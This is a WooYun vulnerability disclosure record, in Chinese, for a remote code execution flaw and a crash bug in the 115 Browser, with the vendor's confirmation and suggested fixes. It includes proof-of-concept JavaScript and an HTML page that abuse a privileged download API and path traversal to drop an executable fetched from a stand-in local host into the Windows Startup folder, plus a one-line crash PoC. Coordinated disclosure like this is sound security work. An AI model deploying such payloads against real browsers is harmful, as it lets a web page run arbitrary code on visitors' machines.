{"id": 73385, "wybug_id": "wooyun-2015-0149968", "wybug_title": "115浏览器远程代码执行漏洞", "wybug_corp": "115网盘", "wybug_author": "隐形人真忙", "wybug_date": "2015-10-28 11:00", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "客户端安全", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-31：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 最新版本的115浏览器，分析内部接口时发现可以远程命令执行。 详细说明：  来看看最新的115浏览器：\n\n\n\n--------------------------------------0x00 远程命令执行---------------------------------------在主页中排查API的时候发现一个下载的API，在browserInterface里，调用格式如下：\nfunction (urls, names, path) { native function NativeBatchDownloadFilesToLocal(); NativeBatchDownloadFilesToLocal(urls, names, path);}\nUrls为下载URL的列表，names为文件名，path为本地保存路径。这个调用参数一看就是chrome://downloads域的文件下载功能的接口。传入参数进行测试：\n\n在下载路径下出现了文件：\n\n但是看到这里的路径用的是默认路径，即：\n\n尝试一下目录跳转，将path改为../test，发现在创建文件夹的时候去掉了特殊符号直接当做文件名本地创建，不存在跳转的逻辑。而names参数可以用来控制文件名，那么使用这个参数控制跳转试试：\n\n可以看到路径中将跳转符号包含进去了，来到下载目录看看，发现已经执行了跳转逻辑：\n\n既然能够利用names参数和path参数联合进行跳转，那么不难写出POC：\nwindow.browserInterface.BatchDownloadFilesToLocal([\"http://127.0.0.1/calc.exe\"], [\"../../../exploitcat/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/calc.exe\"],\"test\") ;\n------------------------------------0x01 任意域执行特权API------------------------------------拿到了命令执行的方法，下面找找特权域吧，经过测试115浏览器居然任意域都能执行特权API。这下连找XSS的步骤都省了。随意一个页面：\n<!DOCTYPE html><html><head></head><body>115浏览器RCE测试<script type=\"text/javascript\">    browserInterface.BatchDownloadFilesToLocal(        [\"http://127.0.0.1/calc.exe\"],         [\"../../../exploitcat/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/calc.exe\"], \"test2\");</script></body></html>\n录制一个gif说明问题：http://7xjb22.com1.z0.glb.clouddn.com/115browserRCE.gif------------------------------------0x02 赠送的DOS漏洞------------------------------------在测试中发现，敏感API中如果参数的类型出错会使浏览器崩溃，造成DOS漏洞。POC如下：\nbrowserInterface.BatchDownload(\"http://www.qq.com\",null,null)\n\n\n   漏洞证明：  1、RCE录制一个gif说明问题：http://7xjb22.com1.z0.glb.clouddn.com/115browserRCE.gif2、DOS\n\n   修复方案：  1、进行浏览器特权域的划分2、修复下载接口的目录跳转漏洞3、修复DOS漏洞，进行参数类型校验   版权声明：转载请注明来源 隐形人真忙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-28 14:31 厂商回复： 确认问题存在，感谢对115浏览器的支持，我们尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-28 11:13 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1003 漏洞数:232        | 1.乌云最帅的男人                        ...)\t\t \n  前排    \n     2015-10-28 11:16 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:233 漏洞数:81        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  牛    \n     2015-10-28 11:29 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:67        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  逼    \n     2015-10-28 11:32 |    \t\t岛云首席鉴黄师 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:123        | icisaw.cn 超低价虚拟主机VPS 购买返现 支...)\t\t \n  的    \n     2015-10-28 14:48 |    \t\t隐形人真忙 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:17        | Hello hacker！)\t\t \n  ：-（  敢不敢给20    \n     2015-10-28 14:59 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1003 漏洞数:232        | 1.乌云最帅的男人                        ...)\t\t \n  @隐形人真忙 楼层被你打乱了    \n     2015-11-03 11:06 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | for fun……)\t\t \n  猫猫最近略凶猛啊    \n     2015-11-03 11:12 |    \t\t隐形人真忙 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:17        | Hello hacker！)\t\t \n  @Sai、 hhhhhhhhhh  我也是闲的没事儿等毕业    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}